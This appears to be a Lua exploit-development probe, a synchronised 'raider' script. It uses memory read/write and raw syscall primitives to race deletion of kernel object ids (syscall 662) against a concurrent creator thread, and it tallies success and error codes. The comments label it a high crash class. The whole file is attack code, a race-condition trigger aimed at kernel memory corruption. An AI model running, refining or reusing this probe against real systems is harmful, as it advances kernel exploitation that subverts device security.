-- CRASH_CLASS: HIGH
-- PROBE 900b r3: raider, synchronised. Waits for the creator's ready flag, then deletes
-- the published ids continuously while the creator cancels, polls and deletes them.
print("=== PROBE 900b r3: synchronised raider ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local IDBUF=__IDBUF__
local FLAG=__FLAG__
local ts=memory.alloc(16)
local function sleep_ms(ms) pcall(function() memory.write_qword(ts,uint64(0)) memory.write_qword(ts+8,uint64(ms*1000000)) mk(240)(uint64(ts),uint64(0)) end) end
print(string.format("[0] pid=%s idbuf=%X flag=%X flagval=%X",tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))),IDBUF,FLAG,rd(FLAG) or 0))
local spins=0
while (rd(FLAG) or 0)~=0xCAFE and spins<20000 do spins=spins+1 sleep_ms(1) end
print(string.format("[0] waited spins=%d flag=%X ids=%X,%X",spins,rd(FLAG) or 0,rd(IDBUF) or 0,rd(IDBUF+4) or 0))
local er=memory.alloc(32)
local c_zero,c_esrch,c_busy,c_other=0,0,0,0
local firstzero=-1
for i=1,300 do
  zero(er,32)
  pcall(function() return mk(662)(uint64(IDBUF),uint64(2),uint64(er)) end)
  local e0=rd(er) or 0
  if e0==0 then c_zero=c_zero+1 if firstzero<0 then firstzero=i end
  elseif e0==0x80020003 then c_esrch=c_esrch+1
  elseif e0==0x80020010 then c_busy=c_busy+1
  else c_other=c_other+1 end
  if i%50==0 then print(string.format("    [%d] ids=%X,%X zero=%d esrch=%d busy=%d",i,rd(IDBUF) or 0,rd(IDBUF+4) or 0,c_zero,c_esrch,c_busy)) end
end
print(string.format("[1] del zero=%d esrch=%d busy=%d other=%d firstzero=%d",c_zero,c_esrch,c_busy,c_other,firstzero))
print("[Z] alive pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
